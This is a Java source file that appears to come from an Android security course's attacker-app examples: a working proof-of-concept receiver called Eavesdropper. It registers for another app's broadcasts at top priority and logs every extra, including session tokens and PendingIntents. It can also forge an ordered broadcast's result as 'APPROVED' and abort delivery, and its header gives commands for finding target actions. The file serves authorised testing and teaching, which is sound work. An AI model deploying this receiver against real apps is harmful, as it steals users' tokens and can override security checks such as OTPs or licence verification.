/*
 * Eavesdropper.java — 24-IPC / examples/attacker-app
 *
 * WHAT IT DOES
 *     Registers for the target app's broadcast actions at the maximum possible
 *     priority and logs everything it receives: the action, every extra, and —
 *     for ordered broadcasts — the running result code and result data. It can
 *     optionally rewrite the result and abort delivery so the legitimate
 *     receiver never runs.
 *
 * WHY IT MATTERS
 *     Testers almost always analyse the RECEIVING direction: "which of the
 *     target's receivers can I trigger?" The SENDING direction is missed just
 *     as often and is just as exploitable:
 *
 *       Intent i = new Intent("com.example.target.SESSION_READY");
 *       i.putExtra("token", sessionToken);
 *       sendBroadcast(i);                       // <- to the WHOLE DEVICE
 *
 *     No receiver permission, no setPackage(). Every app on the device that
 *     registers for that action receives the token. There is nothing in the
 *     target's manifest to find, because the bug is in its sending code — which
 *     is precisely why manifest-driven tooling never reports it.
 *
 *     For ORDERED broadcasts there is a second, more aggressive capability. An
 *     ordered broadcast is delivered one receiver at a time in descending
 *     android:priority order, and each receiver may modify the result or call
 *     abortBroadcast() to stop delivery entirely. A receiver at priority
 *     2147483647 (Integer.MAX_VALUE) runs before the legitimate one and can
 *     observe it, rewrite its answer, or suppress it. If the ordered broadcast
 *     was carrying a security decision — an OTP, a licence check, a "device is
 *     verified" result — that is a control the attacker now owns.
 *
 *     See Chapter 24 sections 3.8, 5.2.2 and 5.2.3.
 *
 * HOW TO RUN
 *     Passive. It is registered in AndroidManifest.xml and starts working the
 *     moment the APK is installed. Add the target's actions to the
 *     <intent-filter> there, install, then exercise the target's normal
 *     features while watching:
 *
 *     # adb shell
 *     logcat -s poc:I
 *
 *     To find candidate actions first:
 *
 *     # host — from the decompiled target
 *     grep -rnE "new Intent\(\"" out/sources/
 *     grep -rn "sendBroadcast|sendOrderedBroadcast|sendStickyBroadcast" out/sources/
 *     # adb shell — historical broadcast records
 *     dumpsys activity broadcasts | grep -i com.example.target
 *
 * REQUIREMENTS
 *     No permissions. A manifest-declared receiver with android:exported="true".
 *
 *     Version caveats that change the result, and which you must state in a
 *     report rather than assume:
 *       - API 26+: most IMPLICIT broadcasts no longer start manifest-declared
 *         receivers. App-defined actions sent to a manifest receiver are
 *         affected. If nothing arrives, register at RUNTIME instead (see
 *         registerAtRuntime below) — that path is not restricted.
 *       - API 33+: runtime registration must pass RECEIVER_EXPORTED or
 *         RECEIVER_NOT_EXPORTED explicitly.
 *       - <protected-broadcast> actions declared by the system (BOOT_COMPLETED
 *         and friends) cannot be SENT by an app, but they can still be
 *         RECEIVED. Do not confuse the two.
 *
 * AUTHORISED TESTING ONLY.
 */
package com.attacker.poc;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

public class Eavesdropper extends BroadcastReceiver {

    private static final String TAG = "poc";

    /**
     * Set to true to also REWRITE the result and ABORT delivery for ordered
     * broadcasts, so the target's own receiver never runs.
     *
     * Leave it false for a first pass. Aborting is destructive to the target's
     * behaviour and can make the app appear broken, which contaminates the rest
     * of your testing. Turn it on deliberately, for one demonstration, and say
     * in the report that you did.
     */
    private static final boolean HIJACK_ORDERED = false;

    /** What we substitute when HIJACK_ORDERED is on. */
    private static final String FORGED_RESULT = "APPROVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;

        Log.i(TAG, "================ EAVESDROPPER =================");
        Log.i(TAG, "[eavesdrop] action    : " + intent.getAction());
        Log.i(TAG, "[eavesdrop] data      : " + intent.getData());
        Log.i(TAG, "[eavesdrop] package   : " + intent.getPackage());
        Log.i(TAG, "[eavesdrop] flags     : 0x"
                + Integer.toHexString(intent.getFlags()));
        Log.i(TAG, "[eavesdrop] ordered   : " + isOrderedBroadcast());
        Log.i(TAG, "[eavesdrop] initial   : " + isInitialStickyBroadcast()
                + "   (true == this is a STICKY broadcast we joined late)");

        dumpExtras(intent);

        if (isOrderedBroadcast()) {
            Log.i(TAG, "[eavesdrop] resultCode: " + getResultCode());
            Log.i(TAG, "[eavesdrop] resultData: " + getResultData());

            if (HIJACK_ORDERED) {
                setResultCode(android.app.Activity.RESULT_OK);
                setResultData(FORGED_RESULT);
                abortBroadcast();
                Log.i(TAG, "[eavesdrop] *** HIJACKED *** result rewritten to '"
                        + FORGED_RESULT + "' and delivery ABORTED.");
                Log.i(TAG, "            The legitimate receiver will never run.");
                Log.i(TAG, "            If this broadcast carried a security");
                Log.i(TAG, "            decision, we now control the answer.");
            } else {
                Log.i(TAG, "[eavesdrop] (ordered — set HIJACK_ORDERED=true to");
                Log.i(TAG, "            demonstrate rewrite-and-abort)");
            }
        }
        Log.i(TAG, "===============================================");
    }

    /**
     * Print every extra with its runtime type.
     *
     * The type matters as much as the value. A nested android.content.Intent or
     * a PendingIntent in an extra is not a data leak — it is a capability leak,
     * and it may be exploitable in the other direction too. A PendingIntent
     * obtained from another app can be filled in and fired, and it executes
     * with the CREATOR's identity and permissions, not ours.
     *
     * Note the deliberate try/catch: reading extras deserialises whatever is in
     * the parcel, in OUR process. A malformed or hostile Parcelable will throw
     * here rather than in the middle of the report.
     */
    private void dumpExtras(Intent intent) {
        Bundle b;
        try {
            b = intent.getExtras();
        } catch (Exception e) {
            Log.i(TAG, "[eavesdrop] extras failed to deserialise: " + e);
            return;
        }
        if (b == null) {
            Log.i(TAG, "[eavesdrop] no extras");
            return;
        }
        for (String key : b.keySet()) {
            Object v;
            try { v = b.get(key); }
            catch (Exception e) { v = "<undeserialisable: " + e + ">"; }

            String type = (v == null) ? "null" : v.getClass().getName();
            Log.i(TAG, "[eavesdrop]   extra[" + key + "] (" + type + ") = " + v);

            if (v instanceof Intent) {
                Log.i(TAG, "               ^ a nested INTENT. Capability, not");
                Log.i(TAG, "                 just data. Redirection material.");
            } else if (v instanceof android.app.PendingIntent) {
                Log.i(TAG, "               ^ a PENDING INTENT. It fires with the");
                Log.i(TAG, "                 CREATOR's identity. If it is mutable");
                Log.i(TAG, "                 we can fill in its blanks and act as");
                Log.i(TAG, "                 the target app. Check FLAG_MUTABLE.");
            }
        }
    }

    /**
     * Runtime registration, for when a manifest receiver gets nothing.
     *
     * From API 26 most implicit broadcasts cannot start a manifest-declared
     * receiver, but a receiver registered at runtime by a live process is not
     * subject to that restriction. Call this from ProbeActivity.onCreate() and
     * keep the app in the foreground while you exercise the target.
     *
     * Usage:
     *     Eavesdropper.registerAtRuntime(this,
     *             "com.example.target.SESSION_READY",
     *             "com.example.target.LOCATION_UPDATE");
     */
    public static BroadcastReceiver registerAtRuntime(Context ctx, String... actions) {
        IntentFilter f = new IntentFilter();
        for (String a : actions) f.addAction(a);
        f.setPriority(Integer.MAX_VALUE);

        BroadcastReceiver r = new Eavesdropper();
        if (Build.VERSION.SDK_INT >= 33) {
            // API 33 made the export flag mandatory. RECEIVER_EXPORTED means
            // other apps may deliver to us, which is what we want here.
            ctx.registerReceiver(r, f, Context.RECEIVER_EXPORTED);
        } else {
            ctx.registerReceiver(r, f);
        }
        Log.i(TAG, "[eavesdrop] runtime-registered for "
                + java.util.Arrays.toString(actions));
        return r;
    }
}
